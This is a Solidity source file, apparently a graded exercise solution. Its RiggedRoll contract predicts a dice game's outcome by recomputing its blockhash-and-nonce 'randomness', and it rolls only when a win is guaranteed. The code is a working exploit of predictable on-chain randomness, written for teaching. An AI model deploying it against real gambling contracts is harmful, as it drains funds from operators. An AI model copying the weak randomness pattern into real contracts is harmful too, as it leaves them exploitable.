pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;
    
	uint256 msgValue = 0.002 ether;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
	function withdraw(address _addr, uint256 _amount) public onlyOwner {
		require(_amount > 0, "No balance to withdraw");
		(bool sent, ) = _addr.call{ value: _amount }("");
		require(sent, "Failed to send Eth");
	}

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
	function riggedRoll() public onlyOwner {
		require(address(this).balance >= .002 ether, "Not enough ETH");
        uint256 nonce = getVal();
        console.log(nonce);
		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 hash = keccak256(abi.encodePacked(prevHash, diceGame, nonce));
		uint256 roll = uint256(hash) % 16;
		console.log("\t", "   Rigged Roll:", roll);

		if (roll <= 2) {
			diceGame.rollTheDice{ value: msgValue }();
			nonce++;
		} else {
			revert("No Win!");
		}
	}

	function getVal() public view returns (uint256) {
		return diceGame.nonce();
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.
	receive() external payable {}
}
